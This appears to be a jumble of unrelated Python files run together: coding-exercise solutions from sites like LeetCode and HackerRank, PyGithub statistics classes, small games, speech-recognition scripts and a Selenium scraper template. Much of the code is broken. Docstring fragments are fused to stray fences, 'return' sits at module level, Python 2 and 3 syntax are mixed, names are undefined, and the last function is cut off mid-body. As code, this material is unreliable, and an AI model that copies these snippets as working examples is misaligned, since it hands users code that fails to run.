import speech_recognition as sr
import random


list1 = ["Hello", "hi"]
a = random.choice(list1)


def speak(audio):
    speak = Dispatch(("sapi.spvoice"))
    speak.speak(audio)


if __name__ == "__main__":
    speak(a)
    speak("Tell me something so that i can repeat it")


def TakeCommand():
    r = sr.Recognizer()
    with sr.Microphone() as source:
        print("Listening...")
        r.pause_threshold = 1
        r.adjust_for_ambient_noise(source, duration=1)
        audio = r.listen(source)

    try:
        print("Recognizing...")
        Query = r.recognize_google(audio, language="en-in")
        print("User said :", Query)
        speak(f"You have said {Query}")

    except Exception as e:
        print("Say that again...")
        speak("Say that again please")
        return "None"
    return Query


while True:
    if __name__ == "__main__":
        Query = TakeCommand().lower()

class Solution:
    def balancedStringSplit(self, s: str) -> int:
        c = 0
        rc = 0
        lc = 0
        for i in range(len(s)):
            if s[i] == "R":
                rc += 1
            if s[i] == "L":
                lc += 1
            if rc == lc:
                c += 1
                rc = 0
                lc = 0
        return c

def differentSquares(matrix):
    rows = len(matrix)
    cols = len(matrix[0])
    sq_arr = []
    sq_count = 0
    for i in range(rows - 1):
        for j in range(cols - 1):
            sq_2x2 = [
                matrix[i][j],
                matrix[i][j + 1],
                matrix[i + 1][j],
                matrix[i + 1][j + 1],
            ]
            if sq_2x2 not in sq_arr:
                sq_arr.append(sq_2x2)
                sq_count += 1
    return sq_count

# Given an array of integers A sorted in non-decreasing order, return an
# array of the squares of each number, also in sorted non-decreasing order.
#
# Example 1:
#
# Input: [-4,-1,0,3,10]
# Output: [0,1,9,16,100]
#
# Example 2:
#
# Input: [-7,-3,2,3,11]
# Output: [4,9,9,49,121]


class Solution:
    def sortedSquares(self, A):
        negative_stack = []
        res = []

        for num in A:
            if num < 0:
                negative_stack.append(num)
                continue

            while len(negative_stack) and -negative_stack[-1] <= num:
                res.append(negative_stack.pop() ** 2)

            res.append(num ** 2)

        while len(negative_stack):
            res.append(negative_stack.pop() ** 2)

        return res

#!/usr/bin/env python
# coding: utf-8

# In[7]:


class ArrayStack:
    def __init__(self, size):
        self.size = size
        self.List = [0 for i in range(size)]
        self.top = 0

    def Push(self, value):
        if self.top != self.size:
            self.List[self.top] = value
            self.top = self.top + 1
            print(self.List)
        else:
            print("Stack Overflow")

    def Pop(self):
        if self.IsEmpty():
            print("Stack Underflow")
        self.top = self.top - 1
        x = self.List[self.top]
        return x

    def IsEmpty(self):
        if self.top == 0:
            print("Stack Underflow")

    def Peek(self):
        return self.List[self.top - 1]

    def Count(self):
        print("The number of elements in stack is", self.size, "!!!")

    def strExp(self, String):
        s = ArrayStack(len(String))
        for i in String:
            if i == "(" or i == "{" or i == "[":
                s.Push(i)

            elif i == ")" or i == "}" or i == "]":
                s.Pop()

        if s.IsEmpty() == True:
            print("True")

    def Print(self):
        print(self.List)


# Driver Code

size = 4
ob = ArrayStack(size)

print("Pushing elements into stack: ")

ob.Push(7)
ob.Push(2)
ob.Push(8)
ob.Push(9)
print("\n")
ob.Push(2)
ob.Print()

print("\nPopping element from stack: ")

ob.Pop()
ob.Print()

print("\nPeek in stack: ")


ob.Peek()
ob.Print()

print("\nCounting elements in stack: ")
ob.Count()

print("\nString expression in stack: ")
String = "{}()["
ob.strExp(String)


# In[6]:


class Node:
    def __init__(self, value):
        self.value = value
        self.next = None


class Queue:
    def __init__(self):
        self.rear = None  # head
        self.front = None  # tail

    def enqueue(self, value):
        newnode = Node(value)
        if self.rear == None:
            self.front = newnode
            self.rear = newnode
        else:
            self.rear.next = newnode
            self.rear = newnode

    def dequeue(self):
        if self.front == None:
            print("Stack underflow")
        else:
            self.front = self.front.next

    def Print(self):
        a = self.front
        while a != None:
            print(a.value, end=" ")
            a = a.next
        print()


ob = Queue()
print("when inserted in queue")
ob.enqueue(4)
ob.enqueue(3)
ob.enqueue(2)
ob.Print()
print("when deleted from queue")
ob.dequeue()
ob.Print()


# In[ ]:
````

```pyAdd a couple methods to our LinkedList class,
and use that to implement a Stack.
You have 4 functions below to fill in:
insert_first, delete_first, push, and pop.
Think about this while you're implementing:
why is it easier to add an "insert_first"
function than just use "append"?"""

class Element(object):
    def __init__(self, value):
        self.value = value
        self.next = None

class LinkedList(object):
    def __init__(self, head=None):
        self.head = head

    def append(self, new_element):
        current = self.head
        if self.head:
            while current.next:
                current = current.next
            current.next = new_element
        else:
            self.head = new_element

    def insert_first(self, new_element):
        "Insert new element as the head of the LinkedList"
        pass

    def delete_first(self):
        "Delete the first (head) element in the LinkedList as return it"
        pass

class Stack(object):
    def __init__(self,top=None):
        self.ll = LinkedList(top)

    def push(self, new_element):
        "Push (add) a new element onto the top of the stack"
        former = self.ll.head
        new_element.next = former
        self.ll.head = new_element
        pass

    def pop(self):
        "Pop (remove) the first element off the top of the stack and return it"
        first_out = self.ll.head
        if(self.ll.head):
            self.ll.head = first_out.next
        return first_out
        pass

# Test cases
# Set up some Elements
e1 = Element(1)
e2 = Element(2)
e3 = Element(3)
e4 = Element(4)

# Start setting up a Stack
stack = Stack(e1)

# Test stack functionality
stack.push(e2)
stack.push(e3)
print stack.pop().value
print stack.pop().value
print stack.pop().value
print stack.pop()
stack.push(e4)
print stack.pop().value

############################ Copyrights and license ############################
#                                                                              #
# Copyright 2013 Vincent Jacques <vincent@vincent-jacques.net>                 #
# Copyright 2014 Vincent Jacques <vincent@vincent-jacques.net>                 #
# Copyright 2016 Peter Buckley <dx-pbuckley@users.noreply.github.com>          #
# Copyright 2018 Wan Liuyang <tsfdye@gmail.com>                                #
# Copyright 2018 sfdye <tsfdye@gmail.com>                                      #
#                                                                              #
# This file is part of PyGithub.                                               #
# http://pygithub.readthedocs.io/                                              #
#                                                                              #
# PyGithub is free software: you can redistribute it and/or modify it under    #
# the terms of the GNU Lesser General Public License as published by the Free  #
# Software Foundation, either version 3 of the License, or (at your option)    #
# any later version.                                                           #
#                                                                              #
# PyGithub is distributed in the hope that it will be useful, but WITHOUT ANY  #
# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS    #
# FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more #
# details.                                                                     #
#                                                                              #
# You should have received a copy of the GNU Lesser General Public License     #
# along with PyGithub. If not, see <http://www.gnu.org/licenses/>.             #
#                                                                              #
################################################################################

import github.GithubObject


class StatsCodeFrequency(github.GithubObject.NonCompletableGithubObject):
    """
    This class represents statistics of StatsCodeFrequencies. The reference can be found here http://docs.github.com/en/rest/reference/repos/statistics#get-the-number-of-additions-and-deletions-per-week
    """

    @property
    def week(self):
        """
        :type: datetime.datetime
        """
        return self._week.value

    @property
    def additions(self):
        """
        :type: int
        """
        return self._additions.value

    @property
    def deletions(self):
        """
        :type: int
        """
        return self._deletions.value

    def _initAttributes(self):
        self._week = github.GithubObject.NotSet
        self._additions = github.GithubObject.NotSet
        self._deletions = github.GithubObject.NotSet

    def _useAttributes(self, attributes):
        self._week = self._makeTimestampAttribute(attributes[0])
        self._additions = self._makeIntAttribute(attributes[1])
        self._deletions = self._makeIntAttribute(attributes[2])

############################ Copyrights and license ############################
#                                                                              #
# Copyright 2013 Vincent Jacques <vincent@vincent-jacques.net>                 #
# Copyright 2014 Vincent Jacques <vincent@vincent-jacques.net>                 #
# Copyright 2016 Peter Buckley <dx-pbuckley@users.noreply.github.com>          #
# Copyright 2018 Wan Liuyang <tsfdye@gmail.com>                                #
# Copyright 2018 sfdye <tsfdye@gmail.com>                                      #
#                                                                              #
# This file is part of PyGithub.                                               #
# http://pygithub.readthedocs.io/                                              #
#                                                                              #
# PyGithub is free software: you can redistribute it and/or modify it under    #
# the terms of the GNU Lesser General Public License as published by the Free  #
# Software Foundation, either version 3 of the License, or (at your option)    #
# any later version.                                                           #
#                                                                              #
# PyGithub is distributed in the hope that it will be useful, but WITHOUT ANY  #
# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS    #
# FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more #
# details.                                                                     #
#                                                                              #
# You should have received a copy of the GNU Lesser General Public License     #
# along with PyGithub. If not, see <http://www.gnu.org/licenses/>.             #
#                                                                              #
################################################################################

import github.GithubObject


class StatsParticipation(github.GithubObject.NonCompletableGithubObject):
    """
    This class represents StatsParticipations. The reference can be found here http://docs.github.com/en/rest/reference/repos/statistics#get-the-weekly-commit-count-for-the-repo-owner-and-everyone-else
    """

    @property
    def all(self):
        """
        :type: list of int
        """
        return self._all.value

    @property
    def owner(self):
        """
        :type: list of int
        """
        return self._owner.value

    def _initAttributes(self):
        self._all = github.GithubObject.NotSet
        self._owner = github.GithubObject.NotSet

    def _useAttributes(self, attributes):
        if "all" in attributes:  # pragma no branch
            self._all = self._makeListOfIntsAttribute(attributes["all"])
        if "owner" in attributes:  # pragma no branch
            self._owner = self._makeListOfIntsAttribute(attributes["owner"])

############################ Copyrights and license ############################
#                                                                              #
# Copyright 2013 Vincent Jacques <vincent@vincent-jacques.net>                 #
# Copyright 2014 Vincent Jacques <vincent@vincent-jacques.net>                 #
# Copyright 2016 Peter Buckley <dx-pbuckley@users.noreply.github.com>          #
# Copyright 2018 Wan Liuyang <tsfdye@gmail.com>                                #
# Copyright 2018 sfdye <tsfdye@gmail.com>                                      #
#                                                                              #
# This file is part of PyGithub.                                               #
# http://pygithub.readthedocs.io/                                              #
#                                                                              #
# PyGithub is free software: you can redistribute it and/or modify it under    #
# the terms of the GNU Lesser General Public License as published by the Free  #
# Software Foundation, either version 3 of the License, or (at your option)    #
# any later version.                                                           #
#                                                                              #
# PyGithub is distributed in the hope that it will be useful, but WITHOUT ANY  #
# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS    #
# FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more #
# details.                                                                     #
#                                                                              #
# You should have received a copy of the GNU Lesser General Public License     #
# along with PyGithub. If not, see <http://www.gnu.org/licenses/>.             #
#                                                                              #
################################################################################

import github.GithubObject
import github.NamedUser  # TODO remove unused


class StatsPunchCard(github.GithubObject.NonCompletableGithubObject):
    """
    This class represents StatsPunchCards. The reference can be found here http://docs.github.com/en/rest/reference/repos/statistics#get-the-number-of-commits-per-hour-in-each-day
    """

    def get(self, day, hour):
        """
        Get a specific element

        :param day: int
        :param hour: int
        :rtype: int
        """
        return self._dict[(day, hour)]

    def _initAttributes(self):
        self._dict = {}

    def _useAttributes(self, attributes):
        for day, hour, commits in attributes:
            self._dict[(day, hour)] = commits

import random

list = ["s", "p", "sc"]
choice = random.choice(list)

print("s for stone\n")
print("p for paper\n")
print("sc for scicors\n")
print("choose any one from this\n")

user_point = 0
computer_point = 0

number_of_attempts = 1
while number_of_attempts < 11:
    choice = random.choice(list)
    a = str(input())
    if a == "s" and choice == "p":
        print("The computer used paper, so you lost")

    elif a == "s" and choice == "sc":
        print("The computer used scicors, so you win")

    elif a == "p" and choice == "s":
        print("The computer used stone, so you win")

    elif a == "p" and choice == "sc":
        print("The computer used scicors, so you lost")

    elif a == "sc" and choice == "s":
        print("The computer used stone, so you lost")

    elif a == "sc" and choice == "p":
        print("The computer used paper, so you win")

    elif a == choice:
        print("You and computer used same")

    else:
        print("Invalid statement please try again")
        exit

    number_of_attempts = number_of_attempts + 1

    print("Number of attempts remaining", 11 - number_of_attempts)

    if (
        a == "s"
        and choice == "sc"
        or a == "p"
        and choice == "s"
        or a == "sc"
        and choice == "p"
    ):
        user_point = user_point + 1

    elif (
        a == "s"
        and choice == "p"
        or a == "p"
        and choice == "sc"
        or a == "sc"
        and choice == "s"
    ):
        computer_point = computer_point + 1

    else:
        user_point = user_point
        computer_point = computer_point
    print(f"Your score is {user_point} and computer score is {computer_point}")

if user_point > computer_point:
    print("You won the match")
else:
    print("You lost the match")

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the stringConstruction function below.
def stringConstruction(s):
    return len(set(s))


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    q = int(input())

    for q_itr in range(q):
        s = input()

        result = stringConstruction(s)

        fptr.write(str(result) + "\n")

    fptr.close()

def split_and_join(line):
    # write your code here
    return "-".join(line.split(" "))


if __name__ == "__main__":
    line = input()
    result = split_and_join(line)
    print(result)

if __name__ == "__main__":
    s = input()
    print(any(c.isalnum() for c in s))
    print(any(c.isalpha() for c in s))
    print(any(c.isdigit() for c in s))
    print(any(c.islower() for c in s))
    print(any(c.isupper() for c in s))

class Solution:
    def myAtoi(self, str: str) -> int:
        if len(str) == 0:
            return 0
        str = list(str.strip())
        if len(str) == 0:
            return 0
        if str[0] == "-":
            s = -1
        else:
            s = 1
        if str[0] in ["-", "+"]:
            del str[0]
        i = 0
        exp = 0
        while i < len(str) and str[i].isdigit():
            exp = exp * 10 + ord(str[i]) - ord("0")
            i += 1
        return max(-2 ** 31, min(exp * s, 2 ** 31 - 1))

# Given an array of characters, compress it in-place.
#
# The length after compression must always be smaller than or equal to the original array.
#
# Every element of the array should be a character (not int) of length 1.
#
# After you are done modifying the input array in-place, return the new length of the array.
#
# Follow up:
# Could you solve it using only O(1) extra space?
#
# Input:
# ["a","a","b","b","c","c","c"]
#
# Output:
# Return 6, and the first 6 characters of the input array should be: ["a","2","b","2","c","3"]
#
# Explanation:
# "aa" is replaced by "a2". "bb" is replaced by "b2". "ccc" is replaced by "c3".
#
#
# Input:
# ["a"]
#
# Output:
# Return 1, and the first 1 characters of the input array should be: ["a"]
#
# Explanation:
# Nothing is replaced.
#
#
# Input:
# ["a","b","b","b","b","b","b","b","b","b","b","b","b"]
#
# Output:
# Return 4, and the first 4 characters of the input array should be: ["a","b","1","2"].
#
# Explanation:
# Since the character "a" does not repeat, it is not compressed. "bbbbbbbbbbbb" is replaced by "b12".
# Notice each digit has it's own entry in the array


class Solution:
    def compress(self, chars):
        n = len(chars)
        i = 0
        count = 1
        for j in range(1, n + 1):
            if j < n and chars[j] == chars[j - 1]:
                count += 1
            else:
                chars[i] = chars[j - 1]
                i += 1
                if count > 1:
                    for d in str(count):
                        chars[i] = d
                        i += 1
                count = 1
        return i

# A strobogrammatic number is a number that looks the same when rotated 180 degrees (looked at upside down).
#
# Write a function to determine if a number is strobogrammatic. The number is represented as a string.
#
# Example 1:
#
# Input:  "69"
# Output: true
# Example 2:
#
# Input:  "88"
# Output: true
# Example 3:
#
# Input:  "962"
# Output: false


class Solution:
    def isStrobogrammatic(self, num):
        dict = {"6": "9", "9": "6", "8": "8", "0": "0", "1": "1"}

        pointer = len(num) - 1
        nums = []
        while pointer >= 0:
            if num[pointer] not in dict:
                return False

            nums.append(dict[num[pointer]])
            pointer -= 1

        rotate = "".join(nums)

        if rotate != num:
            return False

        return True

class Solution:
    def strongPasswordChecker(self, s: str) -> int:
        len_passwd = len(s)
        lowercase, uppercase, digit = False, False, False
        repeating = []  # list of interval of consecutive char.
        for idx, char in enumerate(s):
            if not lowercase and 97 <= ord(char) <= 122:
                lowercase = True
            if not uppercase and 65 <= ord(char) <= 90:
                uppercase = True
            if not digit and char in {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}:
                digit = True
            if (
                repeating
                and repeating[-1][1] + 1 == idx
                and s[repeating[-1][1]] == s[idx]
            ):
                repeating[-1][1] = idx  # extend the lastest interval
            if (
                0 < idx < len_passwd - 1
                and s[idx - 1] == s[idx] == s[idx + 1]
                and (not repeating or idx > repeating[-1][1])
            ):
                repeating.append([idx - 1, idx + 1])  # new an interval

        def helper(lenpass, case, repeat):
            if 6 <= lenpass <= 20 and case == 3 and repeat == ():
                return 0
            ans = inf

            if lenpass < 6:
                # Insertion
                if repeat:
                    add_repeat = [repeat[0] - 2] if repeat[0] > 4 else []
                    ans = min(
                        ans,
                        helper(
                            lenpass + 1,
                            min(case + 1, 3),
                            tuple(list(repeat[1:]) + add_repeat),
                        ),
                    )
                else:
                    ans = helper(lenpass + 1, min(case + 1, 3), ())
            elif lenpass > 20:
                # Deletion
                if repeat:
                    for i in range(len(repeat)):
                        repeat_del = list(repeat)
                        if repeat_del[i] > 3:
                            repeat_del[i] -= 1
                        else:
                            del repeat_del[i]
                        ans = min(ans, helper(lenpass - 1, case, tuple(repeat_del)))
                else:
                    ans = helper(lenpass - 1, case, ())
            else:
                # Replace
                if repeat:
                    add_repeat = [repeat[0] - 3] if repeat[0] > 5 else []
                    ans = min(
                        ans,
                        helper(
                            lenpass,
                            min(case + 1, 3),
                            tuple(list(repeat[1:]) + add_repeat),
                        ),
                    )
                else:
                    ans = helper(lenpass, min(case + 1, 3), ())
            return 1 + ans

        return helper(
            len_passwd,
            sum([lowercase, uppercase, digit]),
            tuple([term[1] - term[0] + 1 for term in repeating]),
        )


Sol = Solution()
print(Sol.strongPasswordChecker("a"))

class Solution:
    def strongPasswordChecker(self, s: str) -> int:
        len_passwd = len(s)
        lowercase, uppercase, digit = False, False, False
        repeating = []  # list of interval of consecutive char.
        for idx, char in enumerate(s):
            if not lowercase and 97 <= ord(char) <= 122:
                lowercase = True
            if not uppercase and 65 <= ord(char) <= 90:
                uppercase = True
            if not digit and char in {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}:
                digit = True
            if (
                repeating
                and repeating[-1][1] + 1 == idx
                and s[repeating[-1][1]] == s[idx]
            ):
                repeating[-1][1] = idx  # extend the lastest interval
            if (
                0 < idx < len_passwd - 1
                and s[idx - 1] == s[idx] == s[idx + 1]
                and (not repeating or idx > repeating[-1][1])
            ):
                repeating.append([idx - 1, idx + 1])  # new an interval

        def helper(lenpass, case, repeat):
            if 6 <= lenpass <= 20 and case == 3 and repeat == ():
                return 0
            ans = inf

            if lenpass < 6:
                # Insertion
                if repeat:
                    add_repeat = [repeat[0] - 2] if repeat[0] > 4 else []
                    ans = min(
                        ans,
                        helper(
                            lenpass + 1,
                            min(case + 1, 3),
                            tuple(list(repeat[1:]) + add_repeat),
                        ),
                    )
                else:
                    ans = helper(lenpass + 1, min(case + 1, 3), ())
            elif lenpass > 20:
                # Deletion
                if repeat:
                    for i in range(len(repeat)):
                        repeat_del = list(repeat)
                        if repeat_del[i] > 3:
                            repeat_del[i] -= 1
                        else:
                            del repeat_del[i]
                        ans = min(ans, helper(lenpass - 1, case, tuple(repeat_del)))
                else:
                    ans = helper(lenpass - 1, case, ())
            else:
                # Replace
                if repeat:
                    add_repeat = [repeat[0] - 3] if repeat[0] > 5 else []
                    ans = min(
                        ans,
                        helper(
                            lenpass,
                            min(case + 1, 3),
                            tuple(list(repeat[1:]) + add_repeat),
                        ),
                    )
                else:
                    ans = helper(lenpass, min(case + 1, 3), ())
            return 1 + ans

        return helper(
            len_passwd,
            sum([lowercase, uppercase, digit]),
            tuple([term[1] - term[0] + 1 for term in repeating]),
        )


Sol = Solution()
print(Sol.strongPasswordChecker("a"))

# You are given a string representing an attendance record for a student.
# The record only contains the following three characters:
# 'A' : Absent.
# 'L' : Late.
# 'P' : Present.
# A student could be rewarded if his attendance record doesn't contain
# more than one 'A' (absent) or more than two continuous 'L' (late).
#
# You need to return whether the student could be rewarded according to his attendance record.
#
# Example 1:
#
# Input: "PPALLP"
# Output: True
# Example 2:
#
# Input: "PPALLL"
# Output: False


class Solution:
    def checkRecord(self, s):
        countA = 0

        for i in range(len(s)):
            if s[i] == "A":
                countA += 1
            if (i < len(s) - 2) and s[i] == "L" and s[i + 1] == "L" and s[i + 2] == "L":
                return False

        if countA > 1:
            return False
        return True

def maxSubarray(A):
    # A: inputArray
    # m: Max
    #
    #
    m = e = 0
    for i in A:
        e += i
        if e < 0:
            e = 0
        if m < e:
            m = e
    return m

# Given an array of integers and an integer k, you need to find the
# total number of continuous subarrays whose sum equals to k.
#
# Example 1:
#
# Input:nums = [1,1,1], k = 2
# Output: 2

import collections


class Solution:
    def subarraySum(self, nums, k):
        Sum = 0
        previous = collections.defaultdict(int)
        count = 0
        previous[0] += 1

        for index, num in enumerate(nums):
            Sum += num
            if Sum - k in previous:
                count += previous[Sum - k]
            previous[Sum] += 1

        return count

l, s = eval(dir()[0])
r = []
c = 1

t = [[int(s[i : i + 2]) for i in [1, 4]] + [s[7:9]] for s in l]
t = [f"{x // 60:02d}:{x % 60:02d}:{y:02d},{z.ljust(3, str(0))}" for x, y, z in t] + [
    s + ",000"
]  # if I replace str(0) with '0', this increases to 359 characters wtf

for a, b in enumerate(l):
    r.extend([str(c), t[a] + " --> " + t[a + 1], b[11:], ""])
    c += 1
return r[:-1]

# Given two non-empty binary trees s and t, check whether tree t has exactly the same structure
# and node values with a subtree of s. A subtree of s is a tree consists of a node in s and all
# of this node's descendants. The tree s could also be considered as a subtree of itself.
#
# Example 1:
# Given tree s:
#
#      3
#     / \
#    4   5
#   / \
#  1   2
# Given tree t:
#    4
#   / \
#  1   2
# Return true, because t has the same structure and node values with a subtree of s.
# Example 2:
# Given tree s:
#
#      3
#     / \
#    4   5
#   / \
#  1   2
#     /
#    0
# Given tree t:
#    4
#   / \
#  1   2
# Definition for a binary tree node.


class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def isSubtree(self, s: TreeNode, t: TreeNode) -> bool:
        def preOrder(node):
            if not node:
                return "null"

            return (
                "-"
                + str(node.val)
                + "-"
                + preOrder(node.left)
                + "-"
                + preOrder(node.right)
                + "-"
            )

        return preOrder(t) in preOrder(s)

class SuffixTrie:
    def __init__(self, string):
        self.root = {}
        self.endSymbol = "*"
        self.populateSuffixTrieFrom(string)

    def populateSuffixTrieFrom(self, string):
        for i in range(len(string)):
            self.insertSubstringStartingAt(i, string)

    def insertSubstringStartingAt(self, i, string):
        node = self.root

        for j in range(i, len(string)):
            letter = string[j]
            if letter not in node:
                node[letter] = {}
            node = node[letter]
        node[self.endSymbol] = True

    def contains(self, string):
        node = self.root
        for letter in string:
            print(node, letter)
            if letter not in node:
                return False
            node = node[letter]

        return self.endSymbol in node


if __name__ == "__main__":
    string = "babc"
    trie = SuffixTrie(string)
    print(trie.contains("abc"))

# def countSumOfTwoRepresentations3(n, l, r):
#     if r < n // 2 or l > n // 2:
#         return 0
#     return n // 2 - max(l, n-r) + 1
# 87

# countSumOfTwoRepresentations3 = lambda n, l, r: max(n // 2 - max(l, n-r) + 1, 0)
# 66

n, l, r = eval(dir()[0])
return max(n // 2 - max(l, n - r) + 1, 0)
# 50

# Find the sum of all left leaves in a given binary tree.
#
# Example:
#
#     3
#    / \
#   9  20
#     /  \
#    15   7
#
# There are two left leaves in the binary tree, with values 9 and 15 respectively. Return 24.


class TreeNode:
    def __init__(self, val):
        self.val = val
        self.left = left
        self.right = right


class Solution:
    # Iterative
    def sum_of_Left_Leaves(self, root):
        if not root:
            return 0
        node = root
        stack = []
        stack.append(node)
        lsum = 0
        while len(stack) > 0:
            n = stack.pop()

            if n.left is not None:
                if n.left.left is not None and n.left.right is not None:
                    lsum += n.left.val

        stack.append(n.left)
        if n.right is not None:
            stack.append(n.right)
        return lsum

    def sum_of_Left_Leaves_recurssive(self, root):
        if not root:
            return 0

        if root.left is not None:
            if root.left.left is None and root.left.right is None:
                return root.left.val + self.sumOfLeftLeaves(root.right)

        return self.sumOfLeftLeaves(root.left) + self.sumOfLeftLeaves(root.right)

# Given an array of integers, return indices of the two numbers such that they add up to a specific target.
#
# You may assume that each input would have exactly one solution, and you may not use the same element twice.
#
# Example:
#
# Given nums = [2, 7, 11, 15], target = 9,
#
# Because nums[0] + nums[1] = 2 + 7 = 9,
# return [0, 1].


class Solution:
    def __init__(self, arr, target):
        self.arr = arr
        self.target = target

    def twoSum(self):

        dict = {}

        for i, num in enumerate(self.arr):

            if (self.target - num) in dict:
                return [dict[self.target - num], i]
            dict[num] = i


if __name__ == "__main__":
    arr = [2, 7, 11, 15]
    target = 9
    print(Solution(arr, target).twoSum())

import speech_recognition as sr
import wikipedia

r = sr.Recognizer()

with sr.Microphone() as source:
    print("speak to get the summary from wikipedia\n")
    audio = r.listen(source)

try:
    text = r.recognize_google(audio)
    print(wikipedia.summary(text))
except:
    print("sorry not recognize your voice")
```

```pySeveral people are standing in a row and need to be divided into two teams. The first person goes into team 1,
the second goes into team 2, the third goes into team 1 again, the fourth into team 2, and so on.

You are given an array of positive integers - the weights of the people. Return an array of two integers,
where the first element is the total weight of team 1, and the second element is the total weight
of team 2 after the division is complete.

Example:
- For a = [50, 60, 60, 45, 70], the output should be alternatingSums(a) = [180, 105]."""


def alternatingSums(a):
    # Step 1: We begin by creating an array, called "alt_sum", that includes only two elements of value 0.
    alt_sum = [0, 0]
    # Step 2: Moreover, we define the variable "length", which is the numerical value of the length of input array a.
    length = len(a)
    # Step 3: Starting from the first element of input array "a" and working all the way through its length,
    # we check whether the element's index is even or odd. If the element i is even, we add its value to the
    # first element of the "alt_sum" array, whilst if it is odd we add it to the second element.
    for i in range(0, length):
        if i % 2 == 0:
            alt_sum[0] += a[i]
        else:
            alt_sum[1] += a[i]
    # Step 4: To conclude, we return the alt_sum array.
    return alt_sum

# Enter your code here. Read input from STDIN. Print output to STDOUT
m = int(input())
mset = set(map(int, input().split()))
n = int(input())
nset = set(map(int, input().split()))
sym = sorted(list(mset.difference(nset) | nset.difference(mset)))
print(*sym, sep="\n")

# Given a binary tree, check whether it is a mirror of itself (ie, symmetric around its center).
#
# For example, this binary tree [1,2,2,3,4,4,3] is symmetric:
#
#     1
#    / \
#   2   2
#  / \ / \
# 3  4 4  3


class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def isSymmetric(self, root):
        if not root:
            return True

        def helper(node1, node2):
            if not node1 and not node2:
                return True

            if not node1 or not node2:
                return False

            if node1.val != node2.val:
                return False

            return helper(node1.left, node2.right) and helper(node1.right, node2.left)

        return helper(root.left, root.right)

    def isSymmetricIterative(self, root):

        if not root:
            return True

        stack = []
        stack.append([root.left, root.right])

        while len(stack):
            node1, node2 = stack.pop()

            if not node1 and not node2:
                continue

            if not node1 or not node2:
                return False

            if node1.val != node2.val:
                return False

            stack.append([node1.left, node2.right])
            stack.append([node1.right, node2.left])

        return True

# Importing required libraries
from selenium import webdriver

# Specifying the webdriver path
driver = webdriver.Chrome("your_webdriver_path")

# Specifying the URL of the page whose table is to be scrapped

driver.get("your_website_url")

# Maximizing the web page window to test the above mentioned URL opens through the chrome driver or not
driver.maximize_window()

# Specifying the XPath of all the td(or column tags)

column_1 = driver.find_elements_by_xpath("your_xpath_column_1")
column_2 = driver.find_elements_by_xpath("your_xpath_column_2")
column_3 = driver.find_elements_by_xpath("your_xpath_column_3")
column_4 = driver.find_elements_by_xpath("your_xpath_column_4")
column_5 = driver.find_elements_by_xpath("your_xpath_column_5")
column_6 = driver.find_elements_by_xpath("your_xpath_column_6")

# Creating loop to get all records

result = []
for i in range(len(column_1)):
    temporary_data = {
        "column_1": column_1[i].text,
        "column_2": column_2[i].text,
        "column_3": column_3[i].text,
        "column_4": column_4[i].text,
        "column_5": column_5[i].text,
        "column_6": column_6[i].text,
    }
    result.append(temporary_data)

# Coverting raw data into DataFrame

import pandas as pd

df_data = pd.DataFrame(result)
print(df_data)

# Converting DataFrame to .CSV and excel file

# For Excel
df_data.to_excel("result.xlsx", index=False)

# For Csv
df_data.to_csv("result.csv", index=False)

class Solution:
    def leastInterval(self, tasks: List[str], n: int) -> int:
        tasksDict = collections.Counter(tasks)
        heap = []
        c = 0
        for k, v in tasksDict.items():
            heappush(heap, (-v, k))
        while heap:
            i = 0
            stack = []
            while i <= n:
                if len(heap) > 0:
                    index, task = heappop(heap)
                    if index != -1:
                        stack.append((index + 1, task))
                c += 1
                if len(heap) == 0 and len(stack) == 0:
                    break
                i += 1
            for i in stack:
                heappush(heap, i)
        return c

# Replace all ______ with rjust, ljust or center.

thickness = int(input())  # This must be an odd number
c = "H"

# Top Cone
for i in range(thickness):
    print((c * i).rjust(thickness - 1) + c + (c * i).ljust(thickness - 1))

# Top Pillars
for i in range(thickness + 1):
    print((c * thickness).center(thickness * 2) + (c * thickness).center(thickness * 6))

# Middle Belt
for i in range((thickness + 1) // 2):
    print((c * thickness * 5).center(thickness * 6))

# Bottom Pillars
for i in range(thickness + 1):
    print((c * thickness).center(thickness * 2) + (c * thickness).center(thickness * 6))

# Bottom Cone
for i in range(thickness):
    print(
        (
            (c * (thickness - i - 1)).rjust(thickness)
            + c
            + (c * (thickness - i - 1)).ljust(thickness)
        ).rjust(thickness * 6)
    )

import textwrap

def wrap(string, max_width):
    return textwrap.fill(string, width=max_width)

if __name__ == '__main__':
    string, max_width = raw_input(), int(raw_input())
    result = wrap(string, max_width)
    print result
nums = [12, 34, 65, 43, 21, 97, 13, 57, 10, 32]
finalNums = []
moreFinalNums = []


def compareMore(a):
    for x in nums:
        if x > a:
            c = finalNums.append(x)


def compareLess(d):
    for x in nums:
        if x < d:
            c = moreFinalNums.append(x)


get = int(input("To Compare More Than : "))
getAgain = int(input("To Compare Less Than : "))

print("\nMore Than Values : ")
print(compareMore(get))
print(finalNums, "\n")

print("\nLess Than Values : ")
print(compareLess(getAgain))
print(moreFinalNums, "\n")

# Enter your code here. Read input from STDIN. Print output to STDOUT
k = int(input())
l = list(map(int, input().split()))
captain = ((sum(set(l)) * k) - sum(l)) // (k - 1)
print(captain)

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the maxSubarray function below.
def maxSubarray(arr):
    dp = arr.copy()
    m = max(arr)
    print(arr, dp)
    if dp[0] < 0:
        dp[0] = 0
    for i in range(1, len(arr)):
        if arr[i - 1] > 0:
            arr[i] += arr[i - 1]
        if dp[i - 1] > 0:
            if dp[i] < 0:
                dp[i] = dp[i - 1]
            else:
                dp[i] += dp[i - 1]
        else:
            dp[i] = dp[i - 1]
        # print(arr, dp)
    if max(dp) == 0:
        return max(arr), m
    return max(arr), max(dp)


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    t = int(input())

    for t_itr in range(t):
        n = int(input())

